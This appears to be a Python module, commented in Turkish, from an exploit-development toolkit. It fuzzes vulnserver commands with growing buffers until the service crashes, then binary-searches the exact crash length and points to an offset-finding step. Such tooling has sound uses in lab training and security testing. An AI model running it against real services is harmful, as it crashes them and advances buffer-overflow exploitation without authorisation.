#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious fuzzer modülü - akıllı artımlı buffer overflow fuzzer
"""

import time
import sys
from typing import Optional

from cekirdek.gunluk import Gunluk
from cekirdek.baglanti import BaglantiYoneticisi, BaglantiHatasi


# desteklenen vulnserver komutları
DESTEKLENEN_KOMUTLAR = [
    "TRUN", "GMON", "KSTET", "GTER", "HTER",
    "LTER", "KSTAN", "STATS", "RTIME", "LTIME",
]


# binary search eşik değeri — fark bu değerin altına düştüğünde arama durdurulur
_BINARY_SEARCH_ESIGI = 10


def _payload_olustur(komut: str, boyut: int) -> bytes:
    """
    vulnserver komutu ile payload oluşturur

    parametreler:
        komut: vulnserver komutu (ör: TRUN)
        boyut: tampon boyutu (byte cinsinden)

    döndürür:
        gönderime hazır byte verisi
    """
    ham_veri = f"{komut} /.:/{'A' * boyut}"
    return ham_veri.encode("latin-1")


def fuzzing_baslat(
    hedef_ip: str,
    hedef_port: int,
    komut: str = "TRUN",
    baslangic_boyutu: int = 100,
    adim_boyutu: int = 100,
    maksimum_boyut: int = 10000,
    bekleme_suresi: float = 1.0,
    zaman_asimi: float = 5.0,
    gunluk: Optional[Gunluk] = None,
) -> Optional[int]:
    """
    hedef servise artımlı buffer göndererek çökme noktasını tespit eder

    süreç:
        1. başlangıç boyutundan başlayarak artan miktarda 'A' karakteri gönderir
        2. her gönderimden sonra hedefin yanıt verip vermediğini kontrol eder
        3. çökme tespit edildiğinde kesin byte uzunluğunu raporlar

    parametreler:
        hedef_ip: hedef sunucu ip adresi
        hedef_port: hedef sunucu port numarası
        komut: test edilecek vulnserver komutu
        baslangic_boyutu: ilk tampon boyutu (byte)
        adim_boyutu: her adımdaki artış miktarı (byte)
        maksimum_boyut: maksimum tampon boyutu (byte)
        bekleme_suresi: gönderimler arası bekleme (saniye)
        zaman_asimi: bağlantı zaman aşımı (saniye)
        gunluk: loglama nesnesi

    döndürür:
        çökme tespit edilen byte uzunluğu veya none (çökme yoksa)
    """
    log = gunluk or Gunluk()

    log.baslik(f"fuzzer başlatılıyor - {komut}")
    log.bilgi(f"hedef          : {hedef_ip}:{hedef_port}")
    log.bilgi(f"komut          : {komut}")
    log.bilgi(f"başlangıç      : {baslangic_boyutu} byte")
    log.bilgi(f"adım           : {adim_boyutu} byte")
    log.bilgi(f"maksimum       : {maksimum_boyut} byte")
    log.bilgi(f"bekleme        : {bekleme_suresi} saniye")
    log.bos_satir()

    # hedef erişilebilirlik kontrolü
    baglanti = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, log)
    if not baglanti.hedef_eriselebilir_mi():
        log.hata(f"hedef erişilemiyor: {hedef_ip}:{hedef_port}")
        log.hata("hedef servisin çalıştığından emin olun")
        return None

    log.basari("hedef erişilebilir, fuzzing başlıyor...")
    log.bos_satir()

    mevcut_boyut = baslangic_boyutu
    gonderim_sayaci = 0

    try:
        while mevcut_boyut <= maksimum_boyut:
            gonderim_sayaci += 1
            payload = _payload_olustur(komut, mevcut_boyut)

            log.bilgi(
                f"[{gonderim_sayaci:04d}] gönderiliyor: {mevcut_boyut} byte"
            )

            try:
                yeni_baglanti = BaglantiYoneticisi(
                    hedef_ip, hedef_port, zaman_asimi, log
                )
                yeni_baglanti.baglan_ve_gonder(payload, deneme_sayisi=1)
            except BaglantiHatasi:
                # bağlantı kurulamadı - hedef çökmüş olabilir
                log.bos_satir()
                log.basari(f"hedef çöktü! çökme boyutu: ~{mevcut_boyut} byte")
                log.bilgi(
                    f"önceki başarılı gönderim: {mevcut_boyut - adim_boyutu} byte"
                )
                log.bos_satir()

                # kesin çökme noktasını bulmak için binary search
                kesin_nokta = _kesin_cokme_noktasi_bul(
                    hedef_ip,
                    hedef_port,
                    komut,
                    mevcut_boyut - adim_boyutu,
                    mevcut_boyut,
                    zaman_asimi,
                    log,
                )

                if kesin_nokta:
                    log.basari(f"kesin çökme noktası: {kesin_nokta} byte")
                else:
                    log.uyari(
                        f"kesin nokta belirlenemedi, tahmini: "
                        f"{mevcut_boyut - adim_boyutu}-{mevcut_boyut} byte arası"
                    )

                log.bos_satir()
                log.bilgi("sonraki adım: offset tespiti için pattern gönderimi")
                log.bilgi(
                    f"  python3 noxious.py offset --hedef {hedef_ip} "
                    f"--port {hedef_port} --uzunluk {mevcut_boyut + 400}"
                )

                return kesin_nokta or mevcut_boyut

            mevcut_boyut += adim_boyutu
            time.sleep(bekleme_suresi)

    except KeyboardInterrupt:
        log.bos_satir()
        log.uyari(f"kullanıcı tarafından durduruldu (son boyut: {mevcut_boyut} byte)")
        return None

    log.bos_satir()
    log.uyari(
        f"maksimum boyuta ({maksimum_boyut} byte) ulaşıldı, çökme tespit edilemedi"
    )
    log.bilgi("adım boyutunu küçültmeyi veya farklı bir komut denemeyi düşünün")
    return None


def _kesin_cokme_noktasi_bul(
    hedef_ip: str,
    hedef_port: int,
    komut: str,
    alt_sinir: int,
    ust_sinir: int,
    zaman_asimi: float,
    gunluk: Gunluk,
) -> Optional[int]:
    """
    binary search ile kesin çökme noktasını bulur

    not: bu fonksiyon her denemede hedefin yeniden başlatılmasını gerektirir.
    vulnserver gibi otomatik yeniden başlayan servisler için idealdir.

    parametreler:
        hedef_ip: hedef ip
        hedef_port: hedef port
        komut: test komutu
        alt_sinir: çökme olmayan son boyut
        ust_sinir: çökme olan ilk boyut
        zaman_asimi: bağlantı zaman aşımı
        gunluk: loglama nesnesi

    döndürür:
        kesin çökme noktası veya none
    """
    gunluk.bilgi("kesin çökme noktası aranıyor (binary search)...")

    # hedefin yeniden başlaması için bekle
    time.sleep(3)

    # hedef yeniden erişilebilir mi kontrol et
    kontrol = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, gunluk)
    if not kontrol.hedef_eriselebilir_mi():
        gunluk.uyari(
            "hedef yeniden başlamadı, binary search atlanıyor"
        )
        gunluk.bilgi("hedefi manuel olarak yeniden başlatın")
        return None

    # fark çok küçükse binary search anlamsız
    if ust_sinir - alt_sinir <= _BINARY_SEARCH_ESIGI:
        return ust_sinir

    maksimum_deneme = 10
    deneme = 0

    while ust_sinir - alt_sinir > 10 and deneme < maksimum_deneme:
        deneme += 1
        orta_nokta = (alt_sinir + ust_sinir) // 2

        gunluk.ayiklama(
            f"  binary search: {alt_sinir}-{ust_sinir}, "
            f"deneniyor: {orta_nokta} byte"
        )

        # hedefin hazır olmasını bekle
        time.sleep(2)
        kontrol_bg = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, gunluk)
        if not kontrol_bg.hedef_eriselebilir_mi():
            gunluk.uyari("hedef erişilemiyor, binary search durduruluyor")
            return ust_sinir

        payload = _payload_olustur(komut, orta_nokta)

        try:
            bg = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, gunluk)
            bg.baglan_ve_gonder(payload, deneme_sayisi=1)

            # gönderim başarılı, hedef çökmedi
            time.sleep(1)

            # çökme sonrası kontrol
            kontrol_sonrasi = BaglantiYoneticisi(
                hedef_ip, hedef_port, zaman_asimi, gunluk
            )
            if kontrol_sonrasi.hedef_eriselebilir_mi():
                # hala ayakta, alt sınırı yükselt
                alt_sinir = orta_nokta
            else:
                # çöktü ama bağlantı başarılıydı
                ust_sinir = orta_nokta
        except BaglantiHatasi:
            # bağlanamadık, çökmüş
            ust_sinir = orta_nokta

    return ust_sinir

